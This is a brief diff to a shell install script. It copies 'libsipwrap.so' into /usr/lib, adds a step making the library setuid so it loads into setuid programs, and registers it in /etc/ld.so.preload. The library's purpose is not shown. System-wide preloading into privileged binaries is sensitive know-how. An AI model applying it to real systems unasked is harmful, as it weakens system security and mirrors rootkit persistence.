@@ -24,6 +24,11 @@ LIB_DIR="/usr/lib/"
 LIBS=("libsipwrap.so")
 cp -t $LIB_DIR ${LIBS[@]/#/bin/}
 
+##################################################################
+## Make libraries setuid so they are loaded for setuid programs ##
+################################################################## 
+chmod u+s ${LIBS[@]/#/$LIB_DIR}
+
 ##############################################################
 ## Append the name of our '.so' file to 'etc/ld.so.preload' ##
 ##############################################################
